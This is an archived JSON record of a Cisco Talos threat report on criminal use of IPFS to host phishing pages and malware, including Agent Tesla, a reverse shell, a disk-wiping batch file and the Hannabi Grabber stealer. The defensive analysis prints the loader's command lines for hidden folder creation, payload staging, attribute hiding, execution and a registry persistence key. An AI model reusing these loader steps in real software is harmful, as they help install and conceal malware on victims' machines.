{
    "id": "2cf76400-b05f-49ff-955d-7061de0099d3",
    "created_at": "2023-01-12T14:59:33.903106Z",
    "updated_at": "2025-03-27T02:05:33.376809Z",
    "deleted_at": null,
    "sha1_hash": "c19ceb9d2242e498493a220e9687c799ca04bbc0",
    "title": "2022-11-09 - Threat Spotlight- Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns",
    "authors": "",
    "file_creation_date": "2022-11-28T19:02:42Z",
    "file_modification_date": "2022-11-28T19:02:42Z",
    "file_size": 1635245,
    "plain_text": "# Threat Spotlight: Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns\n\n**blog.talosintelligence.com/ipfs-abuse/**\n\nEdmund Brumaghin November 9, 2022\n\nThe InterPlanetary File System (IPFS) is an emerging Web3 technology that is\ncurrently seeing widespread abuse by threat actors.\nCisco Talos has observed multiple ongoing campaigns that leverage the IPFS network\nto host their malware payloads and phishing kit infrastructure while facilitating other\nattacks.\nIPFS is often used for legitimate purposes, which makes it more difficult for security\nteams to differentiate between benign and malicious IPFS activity in their networks.\nMultiple malware families are currently being hosted within IPFS and retrieved during\nthe initial stages of malware attacks.\nOrganizations should become familiar with these new technologies and how they are\nbeing leveraged by threat actors to defend against new techniques that use them.\n\n[The emergence of new Web3 technologies in recent years has resulted in drastic changes to](https://blog.talosintelligence.com/securing-web-3-0-metaverse-and-beyond/)\nthe way content is hosted and accessed on the internet. Many of these technologies are\nfocused on circumventing censorship and decentralizing control of large portions of the\ncontent and infrastructure people use and access on a regular basis. While these\ntechnologies have legitimate uses in a variety of practical applications, they also create\nopportunities for adversaries to take advantage of them within their phishing and malware\ndistribution campaigns. Over the past few years, Talos has observed an increase in the\n[number of cybercriminals taking advantage of technologies like the InterPlanetary File](https://blog.talosintelligence.com/2022/08/dark-utilities.html)\nSystem (IPFS) to facilitate the hosting of malicious content as they provide the equivalent of\n“bulletproof hosting” and are extremely resilient to attempts to moderate the content stored\nthere.\n\n## What is the InterPlanetary File System (IPFS)?\n\nThe InterPlanetary File System (IPFS) is a Web3 technology designed to enable\ndecentralized storage of resources on the internet. When content is stored on the IPFS\nnetwork, it is mirrored across many systems that participate in the network, so that when one\nof these systems is unavailable, other systems can service requests for this content.\n\nIPFS stores different types of data, such as the images associated with NFTs, resources\nused to render web pages, or files that can be accessed by internet users. IPFS was\ndesigned to be resilient against content censorship, meaning that it is not possible to\neffectively remove content from within the IPFS network once it’s stored there.\n\n\n-----\n\n### IPFS gateways\n\nUsers that wish to access content stored within IPFS can do so either using an IPFS client,\n[such as the one provided here, or they can make use of “IPFS Gateways” which effectively](https://docs.ipfs.io/install/ipfs-desktop/)\nsit between the internet and the IPFS network to allow clients to access content hosted on\nthe network. This functionality is similar to what Tor2web gateways provide to access\ncontents within the Tor network without requiring a client installation.\n\n[Anyone can set up an IPFS gateway using a range of publicly available tools. This](https://ipfs.github.io/public-gateway-checker/)\nscreenshot shows several of the public IPFS gateways accessible across the internet.\n\nIt is simple to store new content within IPFS and once there, the content is resilient against\ntakedowns, making it increasingly attractive to a variety of attackers for hosting phishing\npages, malware payloads and other malicious content.\n\nWhen systems use IPFS gateways to access contents stored on the IPFS network, they\ntypically rely on the same HTTP/HTTPS-based communications used to access other\nwebsites on the internet. IPFS gateways can be configured to handle incoming requests in a\nfew different ways. In some implementations, the subdomain specified in the HTTP request\nis often used to locate the requested resource on the IPFS network as shown in the following\n[example, which is a mirrored copy of Wikipedia hosted on the IPFS network. The IPFS](https://www.wikipedia.org/)\nidentifier, or CID, for the resource is highlighted below.\n\n\n-----\n\nhxxps[:]//bafybeiaysi4s6lnjev27ln5icwm6tueaw2vdykrtjkwiphwekaywqhcjze[.]ipfs[.]infuraipfs[.]io\n\nIn other implementations, the IPFS resource location is appended to the end of the URL\nbeing requested, as shown in the following example:\n\nhxxps[:]//ipfs[.]io/ipfs/bafybeiaysi4s6lnjev27ln5icwm6tueaw2vdykrtjkwiphwekaywqhcjze\n\nThere are other methods for handling requests using DNS entries, as well. The specific\n[implementation varies across IPFS gateways. Browsers have even begun implementing](https://www.zdnet.com/article/brave-becomes-first-browser-to-add-native-support-for-the-ipfs-protocol/)\nnative support for the IPFS network, removing the need to use IPFS gateways in some\ncases.\n\n### IPFS use in phishing campaigns\n\nIPFS is currently being leveraged to host phishing kits, which are the websites that phishing\ncampaigns typically use to collect and harvest credentials from unsuspecting victims. In one\nexample, the victim received a PDF that purports to be associated with the DocuSign\ndocument-signing service. A screenshot of one such PDF is shown below.\n\nWhen the victim clicks on the “Review Document” link, they are redirected to a page made to\nappear as if it is a Microsoft authentication page. However, the page is actually being hosted\non the IPFS network\n\n\n-----\n\nThe user is prompted to enter an email address and password. This information is then\ntransmitted to the attacker via an HTTP POST request to an attacker-controlled web server\nwhere it can be collected and processed for use in further attacks.\n\n\n-----\n\nWe ve observed several similar examples in phishing campaigns over the past year, as\nadversaries recognize the content moderation challenges associated with hosting their\nphishing kits on the IPFS network. In this case, the PDF hyperlink was pointing to an IPFS\ngateway that moderated the content to protect potential victims and displayed the following\nmessage to victims attempting to navigate to it.\n\nHowever, the content is still present within the IPFS network and simply changing the IPFS\ngateway being used to retrieve the content confirms this is the case.\n\n## IPFS use in malware campaigns\n\nThere are a variety of threat actors currently leveraging technologies like IPFS in their\nmalware distribution campaigns. It provides low-cost storage for malicious payloads while\noffering resilience against content moderation, effectively acting as “bulletproof hosting” for\nadversaries. Likewise, the use of common IPFS gateways for accessing the malicious\ncontents hosted within the IPFS network makes it more difficult for organizations to block\naccess when compared to the use of malicious domains for content retrieval. We have\nobserved various samples in the wild that are currently leveraging IPFS.\n\nThroughout 2022, we’ve observed the volume of samples in the wild continuing to increase\nas this becomes a more popular hosting method for adversaries. Below is a graphic showing\nthe increase in the number of unique samples relying on IPFS that have been uploaded to\npublic sample repositories.\n\n\n-----\n\n### Agent Tesla malspam campaign\n\nWe’ve observed ongoing malspam campaigns leveraging IPFS throughout the infection\nprocess to eventually retrieve a malware payload. In one example, the email sent to victims\npurports to be from a Turkish financial institution and claims to be associated with SWIFT\npayments, a commonly used system for international monetary transactions.\n\n\n-----\n\nThe email contains a ZIP attachment that holds a PE32 executable. The executable, written\nin .NET, functions as a downloader for the next stage of the infection chain. When executed,\nthe downloader reaches out to an IPFS gateway to retrieve a blob of data that has been\nhosted within the IPFS network as shown below.\n\n\n-----\n\nThis data contains an obfuscated PE32 executable that functions as the next-stage malware\npayload. The downloader takes the data from the IPFS gateway and stores each byte in an\narray. It then uses a key value stored in the executable to convert the byte array into the\nnext-stage PE32.\n\nThis is then reflectively loaded and executed, launching the next stage of the infection\nprocess, which in this case is a remote access trojan (RAT) called [Agent Tesla.](https://malpedia.caad.fkie.fraunhofer.de/details/win.agent_tesla)\n\nIn another example, we observed a variety of malware payloads being uploaded to public\nsample repositories over a period of several months. We identified three distinct clusters of\nmalware that were likely being created by the same threat actor. Code-level issues suggest\nthat many of the samples were currently undergoing active development while being\nuploaded, possibly to test detection capabilities.\n\nIn all three clusters, the initial payload functioned as a loader and operated similarly,\nhowever, the final payload hosted on the IPFS network was different in each cluster. The\nfinal payloads we observed included a Python-based information stealer, reverse shell\n[payloads that were likely generated using msfvenom, and a batch file designed to destroy](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\nvictim systems.\n\n### Initial loader\n\nThe loader used in all of these cases functioned similarly, sometimes hosted on the Discord\ncontent delivery network (CDN), a practice that has become increasingly common with\n[malware distributors as previously described here. The file names used indicate that they](https://blog.talosintelligence.com/2021/04/collab-app-abuse.html)\n\n\n-----\n\nmay have been spread under the guise of cheats and cracks for video games such as\n“Minecraft.” In most cases, the loader was not packed, but we did observe samples packed\nusing [UPX.](https://upx.github.io/)\n\nWhen executed, the loader first creates a directory structure within %APPDATA% using the\nfollowing command:\n\n```\nC:\\Windows\\system32\\cmd.exe /c cd %appdata%\\Microsoft && mkdir Network\n\n```\n\nThe malware then attempts to retrieve Python 3.10 from the legitimate software provider\nusing the cURL command.\n\nThis is notable, as the choice to directly leverage cURL may significantly reduce the number\nof potential victims, as it was not added to Windows as a native command line utility until\nWindows 11. The command line syntax used to initiate the download is shown below.\n```\nC:\\Windows\\system32\\cmd.exe /c curl\nhttps://www.python.org/ftp/python/3.10.4/python-3.10.4-embed-amd64.zip -o\n%appdata%\\Microsoft\\Network\\python-3.10.4-embed-amd64.zip\n\n```\nOnce the ZIP archive has been retrieved, it is then unzipped into the directory that was\npreviously created using the PowerShell “Expand-Archive” cmdlet.\n```\nC:\\Windows\\system32\\cmd.exe /c cd %appdata%\\Microsoft\\Network && powershell\nExpand-Archive python-3.10.4-embed-amd64.zip -DestinationPath\n%appdata%\\Microsoft\\Network\n\n```\nThe malware then attempts to retrieve the final payload in the infection chain, storing it within\nthe Network directory using the filename “Packages.txt.” An example of the loader retrieving\nHannabi Grabber, an information stealer written in Python is shown below.\n\n\n-----\n\nThe loader then uses the attrib.exe utility to set the System and Hidden flags on the\npreviously created directory as well as the Python ZIP archive and final payload that was\nretrieved.\n\n```\nC:\\Windows\\system32\\cmd.exe /c attrib +S +H %appdata%\\Microsoft\\Network\n\n```\n```\nC:\\Windows\\system32\\cmd.exe /c attrib +S +H\n%appdata%\\Microsoft\\Network\\python-3.10.4-embed-amd64.zip\nC:\\Windows\\system32\\cmd.exe /c attrib +S +H\n%appdata%\\Microsoft\\Network\\Packages.txt\n\n```\nFinally, the loader invokes the newly downloaded Python executable and passes the final\npayload as a command line argument, executing the next stage of the infection process.\n```\nC:\\Windows\\system32\\cmd.exe /c cd %appdata%\\Microsoft\\Network && python.exe\nPackages.txt\n\n```\nIn some cases, the malware was also observed achieving persistence via adding entries into\nthe Windows registry at the following locations:\n\n```\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n\n```\n\nDuring our analysis of samples associated with this loader, we observed that the IPFS\ngateway that was being used was no longer servicing requests, however, Talos obtained the\nnext-stage payloads manually via another IPFS gateways for analysis.\n\n### Reverse shell\n\nIn one of the clusters leveraging this loader, we observed that the payload being hosted\nwithin the IPFS network was a Python script containing a large base64 encoded blob along\nwith the Python code responsible for decoding the base64. Note that the following\nscreenshot was redacted for space, as the base64-encoded blob was rather large.\n\n\n-----\n\nThe base64 contained several layers of base64 encoded blobs, each wrapped in Python\ncode responsible for decoding them. After decoding all of the layers, the following is the\ndeobfuscated reverse shell payload.\n\nAt the time of analysis, the C2 server was no longer servicing requests on TCP/4444.\n\n### Destructive Malware\n\nIn another cluster we analyzed, we observed that the final payload hosted within IPFS was a\nWindows batch file, as shown below:\n\nWhen the batch file is retrieved, it is stored within the Network directory using the filename\n“Script.bat.”\n\nThis batch file is responsible for the following destructive behavior:\n\nDeleting volume shadow copies on the system.\n\n\n-----\n\nDeleting directory contents stored within C:\\Users (typically associated with user\nprofiles).\nIterating through all mounted filesystems present on the system and deleting contents\nstored on them.\n\nFortunately for victims, in the samples analyzed the loader incorrectly attempts to invoke the\nbatch file as shown below.\n```\nC:\\Windows\\system32\\cmd.exe /c cd %appdata%\\Microsoft\\Network && powershell\n-Command start script.bat -Verb RunAs\n\n### Hannabi Grabber\n\n```\nThe final cluster of malware associated with this loader is responsible for retrieving and\nexecuting a Python-based information stealer called Hannabi Grabber. In the samples we\nanalyzed, the Python version retrieved does not natively contain the modules required for the\nscript to successfully execute causing the infection process to fail, however, given the\nvolume of features present in the stealer, we analyzed it to confirm detection capabilities in\nthe case that it is distributed via different mechanisms.\n\nHannabi Grabber is a full-featured information stealer written in Python. It leverages Discord\nWebhooks for C2 and data exfiltration. It currently features support for stealing information\nfrom a variety of applications that may be present on victim systems. It collects survey\ninformation from the infected machine, obtains the geographic location of the system via the\nIPInfo service, takes screenshots and eventually transmits that data to an attacker-controlled\nDiscord server in JSON format.\n\nBelow is a listing of many of the various applications the stealer supports.\n\n\n-----\n\nIn addition to the previously listed applications, the malware also supports retrieving\npassword and cookie data from Chrome, as shown below.\n\n\n-----\n\nSimilar functionality also exists to target Mozilla Firefox browser data that may be present on\nthe system.\n\nThe information stealer is particularly interested in Discord and Roblox data. It features\nseveral mechanisms that check for the existence of Discord Token Protectors such as\nDiscordTokenProtector, BetterDiscord and more. If discovered, the malware will attempt to\nbypass them to obtain Discord tokens from the victim. An example of one of these checks is\nshown below.\n\n\n-----\n\nApplication data that is collected is stored within a directory structure inside of the %TEMP%\ndirectory, in a folder called “RedDiscord” that is created by the malware. Before exfiltrating\nthe data, the malware creates a ZIP archive within the RedDiscord directory called “Hannabi<USERNAME>.zip.” The malware first transmits beacon information and will then attempt to\nexfiltrate the newly created ZIP archive.\n\n\n-----\n\nHannabi Grabber has a significant amount of functionality that is common to informationstealing malware. Typically, attackers will attempt to leverage PyInstaller or Py2EXE to\ncompile their Python into a PE32 file format prior to distributing it to victims. This is a case\nwhere instead, the attacker chose to include a Python installation process during the\ninfection and is leveraging Python directly to steal sensitive information from victims.\n\n## Conclusion\n\nMany new Web3 technologies have emerged recently, attempting to provide valuable\nfunctionality to users. As these technologies have continued to see increased adoption for\nlegitimate purposes, they have begun to be leveraged by adversaries as well. We have\ncontinued to observe an increase in the volume of malware and phishing campaigns that are\ntaking advantage of technologies like IPFS for the purposes of hosting malicious\ncomponents used in malware infections, phishing kits used to collect sensitive authentication\ndata and more.\n\n\n-----\n\nWe expect this activity to continue to increase as more threat actors recognize that IPFS can\nbe used to facilitate bulletproof hosting, is resilient against content moderation and law\nenforcement activities, and introduces problems for organizations attempting to detect and\ndefend against attacks that may leverage the IPFS network. Organizations should be aware\nof how these newly emerging technologies are being actively used across the threat\nlandscape and evaluate how to best implement security controls to prevent or detect\nsuccessful attacks in their environments.\n\n## Coverage\n\nWays our customers can detect and block this threat are listed below.\n\n[Cisco Secure Endpoint (formerly AMP for Endpoints) is ideally suited to prevent the](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/index.html)\n[execution of the malware detailed in this post. Try Secure Endpoint for free here.](https://www.cisco.com/c/en/us/products/security/amp-for-endpoints/free-trial.html?utm_medium=web-referral?utm_source=cisco&utm_campaign=amp-free-trial&utm_term=pgm-talos-trial&utm_content=amp-free-trial)\n\n[Cisco Secure Web Appliance web scanning prevents access to malicious websites and](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\ndetects malware used in these attacks.\n\n[Cisco Secure Email (formerly Cisco Email Security) can block malicious emails sent by](https://www.cisco.com/c/en/us/products/security/email-security/index.html)\nthreat actors as part of their campaign. You can try Secure Email for free [here.](https://www.cisco.com/c/en/us/products/security/cloud-mailbox-defense?utm_medium=web-referral&utm_source=cisco&utm_campaign=cmd-free-trial-request&utm_term=pgm-talos-trial)\n\n[Cisco Secure Firewall (formerly Next-Generation Firewall and Firepower NGFW) appliances](https://www.cisco.com/c/en/us/products/security/firewalls/index.html)\nsuch as [Threat Defense Virtual,](https://www.cisco.com/c/en/us/products/collateral/security/firepower-ngfw-virtual/datasheet-c78-742858.html) [Adaptive Security Appliance and](https://www.cisco.com/c/en/us/products/security/adaptive-security-appliance-asa-software/index.html) [Meraki MX can detect](https://meraki.cisco.com/products/appliances)\nmalicious activity associated with this threat.\n\n[Cisco Secure Malware Analytics (Threat Grid) identifies malicious binaries and builds](https://www.cisco.com/c/en/us/products/security/threat-grid/index.html)\nprotection into all Cisco Secure products.\n\n[Umbrella, Cisco’s secure internet gateway (SIG), blocks users from connecting to malicious](https://umbrella.cisco.com/)\ndomains, IPs and URLs, whether users are on or off the corporate network. Sign up for a\n[free trial of Umbrella here.](https://signup.umbrella.com/?utm_medium=web-referral?utm_source=cisco&utm_campaign=umbrella-free-trial&utm_term=pgm-talos-trial&utm_content=automated-free-trial)\n\n[Cisco Secure Web Appliance (formerly Web Security Appliance) automatically blocks](https://www.cisco.com/c/en/us/products/security/web-security-appliance/index.html)\npotentially dangerous sites and tests suspicious sites before users access them.\n\nAdditional protections with context to your specific environment and threat data are available\nfrom the [Firewall Management Center.](https://www.cisco.com/c/en/us/products/security/firepower-management-center/index.html)\n\n\n-----\n\nOpen-source Snort Subscriber Rule Set customers can stay up to date by downloading the\n[latest rule pack available for purchase on Snort.org.](https://www.snort.org/products)\n\nThe following Snort SIDs are applicable to this threat: 60728.\n\nThe following ClamAV signatures are applicable to this threat:\n\nWin.Trojan.AgentTesla-9974905-1\nPdf.Phishing.Agent-9974919-0\nTxt.Malware.ArtifactDeletion-9974896-0\nWin.Trojan.AgentTesla-9974906-0\nWin.Downloader.ReverseShell-9974652-1\nWin.Loader.Hannabi-9974435-0\nWin.Trojan.Hannabi_Grabber-9974436-0\nPy.Malware.ReverseShell-9974437-0\n\n### Orbital Queries\n\n[Cisco Secure Endpoint users can use Orbital Advanced Search to run complex OSqueries to](https://orbital.amp.cisco.com/help/)\nsee if their endpoints are infected with this specific threat. For specific OSqueries on this\nthreat, click [here](https://github.com/Cisco-Talos/osquery_queries/blob/master/win_malware/malware_hannabi_file_artifact.yml)\n\n## Indicators of Compromise\n\n[Indicators of Compromise associated with this threat can be found here.](https://github.com/Cisco-Talos/IOCs/tree/main/2022/11)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-11-09 - Threat Spotlight- Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns.pdf"
    ],
    "report_names": [
        "2022-11-09 - Threat Spotlight- Cyber Criminal Adoption of IPFS for Phishing, Malware Campaigns.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535573,
    "ts_updated_at": 1743041133,
    "ts_creation_date": 1669662162,
    "ts_modification_date": 1669662162,
    "files": {
        "pdf": "https://archive.orkl.eu/c19ceb9d2242e498493a220e9687c799ca04bbc0.pdf",
        "text": "https://archive.orkl.eu/c19ceb9d2242e498493a220e9687c799ca04bbc0.txt",
        "img": "https://archive.orkl.eu/c19ceb9d2242e498493a220e9687c799ca04bbc0.jpg"
    }
}